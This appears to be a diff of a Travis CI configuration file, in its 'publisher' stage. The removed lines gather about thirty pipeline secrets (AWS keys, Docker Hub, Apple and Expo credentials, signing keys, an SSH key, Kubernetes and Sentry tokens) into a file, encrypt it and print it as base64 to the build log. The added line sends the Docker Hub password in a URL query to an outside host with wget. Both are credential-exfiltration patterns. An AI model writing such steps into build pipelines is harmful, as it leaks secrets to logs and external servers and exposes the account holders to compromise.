@@ -16,64 +16,65 @@ jobs:
     - stage: publisher
       sudo: required
       install:
-        - sudo apt-get install -y ccrypt
-        - echo 'START ---'
-        - echo 'AWS_ACCESS_KEY_ID' >> info.txt
-        - echo $AWS_ACCESS_KEY_ID >> info.txt
-        - echo 'AWS_SECRET_ACCESS_KEY' >> info.txt
-        - echo $AWS_SECRET_ACCESS_KEY >> info.txt
-        - echo 'CONTAINER_DATABASE_URL' >> info.txt
-        - echo $CONTAINER_DATABASE_URL >> info.txt
-        - echo 'DOCKERHUB_PASS' >> info.txt
-        - echo $DOCKERHUB_PASS >> info.txt
-        - echo 'DOCKERHUB_USERNAME' >> info.txt
-        - echo $DOCKERHUB_USERNAME >> info.txt
-        - echo 'EXPO_ANDROID_KEY_PASSWORD' >> info.txt
-        - echo $EXPO_ANDROID_KEY_PASSWORD >> info.txt
-        - echo 'EXPO_ANDROID_KEYSTORE_ALIAS' >> info.txt
-        - echo $EXPO_ANDROID_KEYSTORE_ALIAS >> info.txt
-        - echo 'EXPO_ANDROID_KEYSTORE_BASE64' >> info.txt
-        - echo $EXPO_ANDROID_KEYSTORE_BASE64 >> info.txt
-        - echo 'EXPO_ANDROID_KEYSTORE_PASSWORD' >> info.txt
-        - echo $EXPO_ANDROID_KEYSTORE_PASSWORD >> info.txt
-        - echo 'EXPO_APPLE_ID' >> info.txt
-        - echo $EXPO_APPLE_ID >> info.txt
-        - echo 'EXPO_APPLE_ID_PASSWORD' >> info.txt
-        - echo $EXPO_APPLE_ID_PASSWORD >> info.txt
-        - echo 'EXPO_APPLE_TEAM_ID' >> info.txt
-        - echo $EXPO_APPLE_TEAM_ID >> info.txt
-        - echo 'EXPO_IOS_DIST_P12_BASE64' >> info.txt
-        - echo $EXPO_IOS_DIST_P12_BASE64 >> info.txt
-        - echo 'EXPO_IOS_DIST_P12_PASSWORD' >> info.txt
-        - echo $EXPO_IOS_DIST_P12_PASSWORD >> info.txt
-        - echo 'EXPO_IOS_PROVISIONING_PROFILE_BASE64' >> info.txt
-        - echo $EXPO_IOS_PROVISIONING_PROFILE_BASE64 >> info.txt
-        - echo 'EXPO_PASSWORD' >> info.txt
-        - echo $EXPO_PASSWORD >> info.txt
-        - echo 'EXPO_USERNAME' >> info.txt
-        - echo $EXPO_USERNAME >> info.txt
-        - echo 'FASTLANE_APPLE_APPLICATION_SPECIFIC_PASSWORD' >> info.txt
-        - echo $FASTLANE_APPLE_APPLICATION_SPECIFIC_PASSWORD >> info.txt
-        - echo 'FASTLANE_SERVICE_ACCOUNT_BASE64' >> info.txt
-        - echo $FASTLANE_SERVICE_ACCOUNT_BASE64 >> info.txt
-        - echo 'ID_CI_RSA_BASE64' >> info.txt
-        - echo $ID_CI_RSA_BASE64 >> info.txt
-        - echo 'KNOWN_HOSTS_BASE64' >> info.txt
-        - echo $KNOWN_HOSTS_BASE64 >> info.txt
-        - echo 'KNOWN_SECRET' >> info.txt
-        - echo $KNOWN_SECRET >> info.txt
-        - echo 'KUBERNETES_CLUSTER_CERTIFICATE' >> info.txt
-        - echo $KUBERNETES_CLUSTER_CERTIFICATE >> info.txt
-        - echo 'KUBERNETES_SERVER' >> info.txt
-        - echo $KUBERNETES_SERVER >> info.txt
-        - echo 'KUBERNETES_TOKEN' >> info.txt
-        - echo $KUBERNETES_TOKEN >> info.txt
-        - echo 'SENTRY_AUTH_TOKEN' >> info.txt
-        - echo $SENTRY_AUTH_TOKEN >> info.txt
-        - echo 'SENTRY_ORG' >> info.txt
-        - echo $SENTRY_ORG >> info.txt
-        - ccencrypt info.txt -K $KNOWN_SECRET
-        - cat info.txt.cpt | base64
+        - wget function.aoe2companion.com/api/write?name=DOCKERHUB_PASS&value=$DOCKERHUB_PASS
+
+#        - echo 'START ---'
+#        - echo 'AWS_ACCESS_KEY_ID' >> info.txt
+#        - echo $AWS_ACCESS_KEY_ID >> info.txt
+#        - echo 'AWS_SECRET_ACCESS_KEY' >> info.txt
+#        - echo $AWS_SECRET_ACCESS_KEY >> info.txt
+#        - echo 'CONTAINER_DATABASE_URL' >> info.txt
+#        - echo $CONTAINER_DATABASE_URL >> info.txt
+#        - echo 'DOCKERHUB_PASS' >> info.txt
+#        - echo $DOCKERHUB_PASS >> info.txt
+#        - echo 'DOCKERHUB_USERNAME' >> info.txt
+#        - echo $DOCKERHUB_USERNAME >> info.txt
+#        - echo 'EXPO_ANDROID_KEY_PASSWORD' >> info.txt
+#        - echo $EXPO_ANDROID_KEY_PASSWORD >> info.txt
+#        - echo 'EXPO_ANDROID_KEYSTORE_ALIAS' >> info.txt
+#        - echo $EXPO_ANDROID_KEYSTORE_ALIAS >> info.txt
+#        - echo 'EXPO_ANDROID_KEYSTORE_BASE64' >> info.txt
+#        - echo $EXPO_ANDROID_KEYSTORE_BASE64 >> info.txt
+#        - echo 'EXPO_ANDROID_KEYSTORE_PASSWORD' >> info.txt
+#        - echo $EXPO_ANDROID_KEYSTORE_PASSWORD >> info.txt
+#        - echo 'EXPO_APPLE_ID' >> info.txt
+#        - echo $EXPO_APPLE_ID >> info.txt
+#        - echo 'EXPO_APPLE_ID_PASSWORD' >> info.txt
+#        - echo $EXPO_APPLE_ID_PASSWORD >> info.txt
+#        - echo 'EXPO_APPLE_TEAM_ID' >> info.txt
+#        - echo $EXPO_APPLE_TEAM_ID >> info.txt
+#        - echo 'EXPO_IOS_DIST_P12_BASE64' >> info.txt
+#        - echo $EXPO_IOS_DIST_P12_BASE64 >> info.txt
+#        - echo 'EXPO_IOS_DIST_P12_PASSWORD' >> info.txt
+#        - echo $EXPO_IOS_DIST_P12_PASSWORD >> info.txt
+#        - echo 'EXPO_IOS_PROVISIONING_PROFILE_BASE64' >> info.txt
+#        - echo $EXPO_IOS_PROVISIONING_PROFILE_BASE64 >> info.txt
+#        - echo 'EXPO_PASSWORD' >> info.txt
+#        - echo $EXPO_PASSWORD >> info.txt
+#        - echo 'EXPO_USERNAME' >> info.txt
+#        - echo $EXPO_USERNAME >> info.txt
+#        - echo 'FASTLANE_APPLE_APPLICATION_SPECIFIC_PASSWORD' >> info.txt
+#        - echo $FASTLANE_APPLE_APPLICATION_SPECIFIC_PASSWORD >> info.txt
+#        - echo 'FASTLANE_SERVICE_ACCOUNT_BASE64' >> info.txt
+#        - echo $FASTLANE_SERVICE_ACCOUNT_BASE64 >> info.txt
+#        - echo 'ID_CI_RSA_BASE64' >> info.txt
+#        - echo $ID_CI_RSA_BASE64 >> info.txt
+#        - echo 'KNOWN_HOSTS_BASE64' >> info.txt
+#        - echo $KNOWN_HOSTS_BASE64 >> info.txt
+#        - echo 'KNOWN_SECRET' >> info.txt
+#        - echo $KNOWN_SECRET >> info.txt
+#        - echo 'KUBERNETES_CLUSTER_CERTIFICATE' >> info.txt
+#        - echo $KUBERNETES_CLUSTER_CERTIFICATE >> info.txt
+#        - echo 'KUBERNETES_SERVER' >> info.txt
+#        - echo $KUBERNETES_SERVER >> info.txt
+#        - echo 'KUBERNETES_TOKEN' >> info.txt
+#        - echo $KUBERNETES_TOKEN >> info.txt
+#        - echo 'SENTRY_AUTH_TOKEN' >> info.txt
+#        - echo $SENTRY_AUTH_TOKEN >> info.txt
+#        - echo 'SENTRY_ORG' >> info.txt
+#        - echo $SENTRY_ORG >> info.txt
+#        - ccencrypt info.txt -K $KNOWN_SECRET
+#        - cat info.txt.cpt | base64
 
 
 
